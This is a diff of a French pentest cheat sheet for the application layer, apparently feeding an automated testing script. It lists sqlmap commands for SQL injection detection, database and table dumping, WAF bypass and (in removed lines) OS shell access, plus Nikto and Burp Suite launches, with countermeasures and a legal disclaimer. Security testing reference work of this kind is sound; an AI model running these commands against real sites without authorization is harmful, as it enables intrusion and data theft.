@@ -1,79 +1,133 @@
-## 5. `docs/Couche5_7_Application/cheat-couche5-7.md`
+**Chemin :**  
+`docs/Couche5-7_TApplication/cheat-couche_Application.md`
 
 ```markdown
-# Couche 5-7 (Application) – Sqlmap
-**Version Testée : Sqlmap 1.6.x**  
-**Attaque Ciblée : Injection SQL**
+# Couche 5-7 (Application) – Attaques et Outils
 
-*Ce document est structuré pour une intégration avec le script automatisé qui génère un rapport complet des commandes exécutées via Sqlmap.*
+**Version Testée :**
+- Sqlmap 1.6.x
+- Burp Suite Community 2021.10
+- Nikto 2.5.x
 
----
+**Description :**  
+Ce document recense les outils et attaques disponibles pour la couche Application (couches 5 à 7) du modèle OSI.  
+Cette couche concerne l’interaction avec les applications web et les services, incluant l’injection SQL, la manipulation de requêtes HTTP et la découverte de vulnérabilités dans les serveurs web.  
+Le script automatisé analysera ce fichier pour :
+- Lister les outils disponibles (sections marquées par **"### Outil:"**),
+- Afficher, pour chaque outil, les attaques possibles (sections marquées par **"#### Attaque:"**),
+- Proposer les commandes associées pour chaque attaque (commandes présentées dans des blocs de code sous **"###### Commande:"** avec une section "Détails :").
 
-## Sommaire
-
-1. [Introduction](#introduction)
-2. [Installation & Pré-requis](#installation--pré-requis)
-3. [Commandes Clés](#commandes-clés)
-4. [Fonctionnalités Avancées](#fonctionnalités-avancées)
-5. [Contre-mesures](#contre-mesures)
-6. [Intégration avec le Script](#intégration-avec-le-script)
-7. [Références & Ressources](#références--ressources)
-
----
-
-## Introduction
-
-Sqlmap est un outil d’automatisation pour la détection et l’exploitation de vulnérabilités SQL. Il supporte plusieurs SGBD et propose des techniques avancées pour contourner les protections (WAF, etc.).
+Vous pourrez enrichir ce fichier ultérieurement sans modifier le script.
 
 ---
 
-## Installation & Pré-requis
+### Outil: Sqlmap
+**Description :**  
+Sqlmap est un outil d’automatisation pour détecter et exploiter des vulnérabilités SQL dans les applications web.
 
-1. **Python requis.**  
-2. **Cloner le dépôt :**
+#### Attaque: Détection d'injection SQL
+*Détails de l'attaque :*  
+Détecter automatiquement les vulnérabilités d'injection SQL sur une URL cible.
+##### Commandes Clés
+**Commande: Détecter une injection SQL**
 ```bash
-git clone https://github.com/sqlmapproject/sqlmap.git
-cd sqlmap
-3.	Exécution :
-Utilisez python sqlmap.py ou le binaire sqlmap selon votre installation.
-________________________________________
-Commandes Clés
-1. Détection d’une injection SQL
 sqlmap -u "http://site.com/page?id=1" --batch
-Détail :
---batch permet d’automatiser les réponses par défaut.
-2. Extraire les bases de données
+```
+Détails :
+- Utilise le mode batch pour automatiser les choix.
+- Cible : http://site.com/page?id=1
+
+#### Attaque: Extraction des bases de données
+*Détails de l'attaque :*  
+Extraire la liste des bases de données présentes sur le serveur vulnérable.
+##### Commandes Clés
+**Commande: Extraire les bases de données**
+```bash
 sqlmap -u "http://site.com/page?id=1" --dbs
-3. Extraire une table spécifique
+```
+Détails :
+- Affiche la liste des bases de données disponibles.
+
+#### Attaque: Dump d'une table spécifique
+*Détails de l'attaque :*  
+Extraire le contenu d'une table précise après avoir sélectionné la base de données.
+##### Commandes Clés
+**Commande: Dump d'une table spécifique**
+```bash
 sqlmap -u "http://site.com/page?id=1" -D nom_de_base -T nom_de_table --dump
-4. Bypass WAF
+```
+Détails :
+- Remplacez "nom_de_base" et "nom_de_table" par les valeurs correspondantes.
+
+#### Attaque: Bypass WAF
+*Détails de l'attaque :*  
+Utiliser des techniques de contournement pour échapper aux Web Application Firewalls.
+##### Commandes Clés
+**Commande: Bypass WAF avec tamper**
+```bash
 sqlmap -u "http://site.com/page?id=1" --tamper=space2comment
-Détail :
-Utilisation d’un script de modification pour contourner un WAF.
-________________________________________
-Fonctionnalités Avancées
-•	--os-shell : Ouvre un shell système (si supporté par la base).
-•	--sql-shell : Accès interactif à la base de données.
-•	--dump-all : Extraction complète de la base.
-•	--technique= : Spécifier les techniques d’injection à tester (UNION, BOOLEAN, etc.).
-________________________________________
-Contre-mesures
-•	Développement sécurisé : 
-o	Valider et filtrer les entrées utilisateur.
-o	Utiliser des requêtes préparées (ex. PDO).
-•	Défense en profondeur : 
-o	Déployer un WAF.
-o	Appliquer le principe du moindre privilège sur les comptes de base.
-________________________________________
-Intégration avec le Script
-•	Annotations :
-Le script enregistrera l’exécution de chaque commande Sqlmap ainsi que les résultats pour générer un rapport final détaillé.
-•	Log des actions :
-Chaque interaction (commande, option, résultat) sera capturée pour une analyse post-exécution.
-________________________________________
-Références & Ressources
-•	Site Officiel SQLmap
-•	GitHub SQLmap
-•	OWASP Injection
+```
+Détails :
+- Utilise le script tamper "space2comment" pour contourner certaines protections.
 
 ---
+
+### Outil: Burp Suite
+**Description :**  
+Burp Suite est une plateforme intégrée pour tester la sécurité des applications web, offrant des fonctionnalités de proxy, scanner et intruder.
+
+#### Attaque: Analyse et Scan Web
+*Détails de l'attaque :*  
+Utiliser Burp Suite pour scanner les vulnérabilités d'une application web.
+##### Commandes Clés
+**Commande: Lancer Burp Suite Community**
+```bash
+java -jar burpsuite_community.jar
+```
+Détails :
+- Démarrage de l'interface graphique de Burp Suite Community.
+- Nécessite Java installé sur le système.
+
+#### Attaque: Interception de requêtes HTTP
+*Détails de l'attaque :*  
+Intercepter et modifier en temps réel les requêtes HTTP pour tester la robustesse des contrôles d'accès.
+##### Commandes Clés
+**Commande: Lancer Burp avec configuration personnalisée**
+```bash
+java -jar burpsuite_community.jar --config-file=burp_config.json
+```
+Détails :
+- Utilise un fichier de configuration (burp_config.json) pour lancer Burp Suite avec des paramètres pré-définis.
+
+---
+
+### Outil: Nikto
+**Description :**  
+Nikto est un scanner de serveurs web open source qui identifie les problèmes de sécurité et les vulnérabilités connues dans les configurations de serveurs web.
+
+#### Attaque: Scan de vulnérabilités sur un serveur web
+*Détails de l'attaque :*  
+Exécuter un scan complet des vulnérabilités d’un serveur web.
+##### Commandes Clés
+**Commande: Lancer un scan avec Nikto**
+```bash
+nikto -h http://site.com
+```
+Détails :
+- Cible : http://site.com.
+- Analyse des vulnérabilités connues du serveur web.
+
+---
+
+## Précautions Légales & Disclaimer
+**Attention :**  
+L’utilisation de ces outils et commandes doit être réalisée dans un cadre légal et exclusivement en environnement de test. Toute utilisation malveillante est strictement interdite.
+
+---
+
+## Références & Ressources
+- [Sqlmap Official Website](https://sqlmap.org/)
+- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)
+- [Nikto Project](https://cirt.net/Nikto2)
+- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
+```
